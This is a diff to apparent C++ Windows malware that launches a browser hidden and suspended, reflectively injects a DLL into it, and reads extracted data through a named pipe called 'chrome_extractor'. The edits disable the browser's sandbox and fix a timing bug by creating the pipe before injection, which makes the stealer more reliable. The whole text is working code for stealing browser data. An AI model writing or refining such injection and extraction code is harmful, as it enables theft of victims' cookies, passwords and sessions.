@@ -3,6 +3,7 @@
 #include <iostream>
 #include <vector>
 #include <string>
+#include <cstring>
 #include <filesystem>
 #include <fstream>
 #include "bootstrapper.h"
@@ -161,7 +162,7 @@ void inject_and_collect(const std::string& dll_bytes, const BrowserConfig& confi
     si.wShowWindow = SW_HIDE;
     PROCESS_INFORMATION pi = {0};
 
-    std::wstring cmd = std::wstring(config.exe_name.begin(), config.exe_name.end()) + L" --headless --disable-gpu";
+    std::wstring cmd = std::wstring(config.exe_name.begin(), config.exe_name.end()) + L" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox";
     std::vector<wchar_t> cmd_buf(cmd.begin(), cmd.end());
     cmd_buf.push_back(0);
     BOOL success = CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
@@ -170,7 +171,7 @@ void inject_and_collect(const std::string& dll_bytes, const BrowserConfig& confi
         std::string path = find_browser_exe(config.name);
         if (!path.empty()) {
             std::wstring wpath = std::wstring(path.begin(), path.end());
-            cmd = L"\"" + wpath + L"\" --headless --disable-gpu";
+            cmd = L"\"" + wpath + L"\" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox";
             std::vector<wchar_t> cmd_buf_full(cmd.begin(), cmd.end());
             cmd_buf_full.push_back(0);
             success = CreateProcessW(NULL, cmd_buf_full.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
@@ -182,10 +183,10 @@ void inject_and_collect(const std::string& dll_bytes, const BrowserConfig& confi
         return;
     }
 
+    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 65536, 65536, 0, NULL);
+
     inject_dll_reflective(pi.hProcess, dll_bytes);
     ResumeThread(pi.hThread);
-
-    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 65536, 65536, 0, NULL);
 
     if (h_pipe != INVALID_HANDLE_VALUE) {
         std::cout << "Waiting for DLL connection..." << std::endl;
